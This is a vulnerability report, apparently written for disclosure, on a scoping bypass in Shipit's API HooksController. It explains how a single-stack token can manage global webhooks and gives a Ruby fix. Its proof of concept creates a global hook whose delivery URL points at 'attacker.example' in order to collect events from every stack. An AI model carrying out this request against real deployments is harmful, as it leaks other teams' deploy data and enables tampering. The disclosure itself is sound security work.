### Title
API hook scoping bypass lets a single-stack-scoped ApiClient create/read/manage global hooks that receive events for every stack - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
`Shipit::ApiClient` can be bound to a single stack via its `stack_id` column, and `Shipit::Api::BaseController#stacks`/`#stack` correctly enforce that binding for every stack-scoped resource by restricting the queryable `Stack` collection to `current_api_client.stack_id`. `Shipit::Api::HooksController`, however, is mounted both under a stack scope and as a top-level, unscoped `resources :hooks` route (`config/routes.rb`). When a request hits the unscoped route (no `stack_id` param), the controller's own `stack_id` helper simply evaluates to `nil` and never consults `current_api_client.stack_id`, so the "hooks" collection becomes `Hook.where(stack_id: nil)` — the set of *global* hooks that receive events for every stack in the installation, regardless of what stack the token is authorized for.

### Finding Description
`Shipit::ApiClient#stack_id` is meant to scope an API token to a single stack: `BaseController#stacks` uses it to compute the visible stack collection [1](#0-0) , and every other stack-scoped controller (`tasks`, `deploys`, `merge_requests`, `locks`, `stacks#show/update/destroy`) resolves its target stack through that scoped collection via `stacks.from_param!`.

`HooksController`, however, computes its target collection independently: [2](#0-1) 
`stack_id` only checks `params[:stack_id].present?`; it never checks or intersects with `current_api_client.stack_id`. Because the same controller is routed both under a stack scope (`/api/stacks/:stack_id/hooks`) and as a standalone, unscoped collection (`/api/hooks`) in `config/routes.rb` [3](#0-2) , a request to the unscoped `/api/hooks` path never supplies `stack_id`, so `stack_id` evaluates to `nil` and `hooks` resolves to `Hook.where(stack_id: nil)` — i.e., the model's `global` scope [4](#0-3) . Global hooks are delivered for events from **every** stack, per `Hook.for_stack`/`Hook.deliver` (`where(stack_id: [nil, stack_id])`) [5](#0-4) .

Authorization on this controller is enforced only via `require_permission :read, :hook` / `require_permission :write, :hook`, which calls `ApiClient#check_permissions!` [6](#0-5)  — a check that only inspects the `permissions` array, never the client's `stack_id`. Nothing in `require_permission`, `check_permissions!`, or `HooksController` cross-checks that a client bound to one stack (e.g. fixture `here_come_the_walrus`, which has `stack: shipit`) is prevented from touching the global hooks collection.

This breaks the equality that should hold: **stack a token authorizes == stack(s) a hook write/read actually touches**. A token issued and scoped to Stack A, with `write:hook`/`read:hook` permission (intended to let it manage webhooks for Stack A only), can instead create, list, update, or delete a *global* hook that will receive `deploy`, `task`, `commit_status`, `merge`, `rollback`, `lock`, etc. events for every stack managed by the Shipit instance — including stacks/repositories the token was never authorized to see.

### Impact Explanation
This maps to the "High" impact bucket: escalation into broader authorization than the token/`Shipit.github_teams`-equivalent scoping intends, and unauthenticated/unauthorized read of stack state, task streams, and deploy output across repositories the client has no legitimate access to. A malicious or compromised single-stack API token can point a global `Hook#delivery_url` at an attacker-controlled endpoint and passively receive deploy/rollback/task/commit-status/merge events (which include commit SHAs, deploy status, and stack metadata) for every stack in the Shipit deployment — a cross-stack information-disclosure primitive obtained purely by an over-permissioned-looking but nominally scoped credential. It can also destroy or rewrite the delivery URL of an existing global hook used by the whole organization, disrupting other teams' automation (write path).

### Likelihood Explanation
Likelihood is moderate: exploitation requires possession of a valid `ApiClient` token that has `write:hook` (or `read:hook`) permission, whether or not it's scoped to a stack via `stack_id`. Granting `write:hook`/`read:hook` to a stack-scoped client is a normal, expected configuration (the whole point of `stack_id` is to let operators hand out narrowly-scoped tokens), so this is a realistic, low-effort misuse of a legitimately issued credential rather than a theoretical edge case — the attacker simply omits the `stack_id` path segment.

### Recommendation
In `Shipit::Api::HooksController`, restrict the unscoped/global hooks collection to clients that are not stack-restricted (`current_api_client.stack_id?` should be false), or better, always intersect the requested scope with the client's authorized stack:

```ruby
def hooks
  if current_api_client.stack_id?
    # A stack-scoped client may only manage hooks for its own stack.
    Hook.where(stack_id: current_api_client.stack_id)
  else
    Hook.where(stack_id:)
  end
end
```
Alternatively, reuse `BaseController#stacks` to validate that any `stack_id` (including the implicit "global" `nil`) is permitted for the current client before building the `hooks` relation.

### Proof of Concept
1. Create an `ApiClient` scoped to Stack A: `ApiClient.create!(creator: user, name: "scoped", stack: stack_a, permissions: %w[write:hook read:hook])`.
2. Using that client's `authentication_token`, issue `POST /api/hooks` (note: no `stack_id` in the path) with `{ delivery_url: "https://attacker.example/collect", events: ["deploy", "task", "commit_status"] }`.
3. `HooksController#create` succeeds (`write:hook` permission check passes) and creates a `Hook` with `stack_id: nil`, i.e. a global hook [7](#0-6) .
4. Any deploy, task, rollback, commit-status, or merge event on **any** stack in the installation — not just Stack A — is now delivered to `https://attacker.example/collect`, per `Hook.deliver`/`for_stack` [5](#0-4) , demonstrating the token escaped its intended single-stack authorization boundary.
